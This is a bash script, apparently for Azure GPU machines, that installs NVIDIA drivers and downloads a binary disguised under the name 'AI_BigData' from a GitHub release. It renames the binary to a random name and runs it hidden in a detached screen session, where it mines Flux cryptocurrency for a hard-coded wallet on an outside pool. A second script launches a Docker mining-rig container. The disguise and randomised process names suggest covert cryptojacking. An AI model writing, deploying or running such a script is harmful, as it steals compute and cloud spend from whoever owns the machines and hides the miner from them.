#!/bin/bash
apt-get update && apt-get install -y docker.io screen
sudo apt-get install -y build-essential gcc-multilib dkms
apt-get install -y git wget screen
sudo dpkg --add-architecture i386
sudo apt update
sudo apt install -y libc6:i386
azure=mxsemsdnlkdj
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
apt-get install -y git wget screen
rm -rf NVIDIA-Linux-x86_64-470.82.01-grid-azure.run
wget https://download.microsoft.com/download/a/3/c/a3c078a0-e182-4b61-ac9b-ac011dc6ccf4/NVIDIA-Linux-x86_64-470.82.01-grid-azure.run
sudo chmod +x NVIDIA-Linux-x86_64-470.82.01-grid-azure.run
sudo ./NVIDIA-Linux-x86_64-470.82.01-grid-azure.run --dkms -s --no-opengl-files
rm -r /usr/share/work/$azure
mkdir /usr/share
mkdir /usr/share/work
wget https://github.com/wollfoo/wolethv100/releases/download/wollfoo007/AI_BigData
mv AI_BigData /usr/share/work/ && cd  /usr/share/work/ && chmod 777 AI_BigData
mv AI_BigData $azure -n
cp $azure "$cpuname"
rm -f  AI_BigData
echo $cpuname" is starting"
screen -d -m ./"${cpuname}" --user t1SzPN5ZrAccHeSGPcxwzuwL9Qk54GUzEJi.bbzz --ssl --server eu-flux.fluxpools.net --port 7003 --pass wow --algo 125_4 --pers ZelProof

#!/bin/bash
docker rm -f cpudataissa
docker run --add-host=localhost:127.215.121.222 -d --name cpudataissa nvts/cpurig
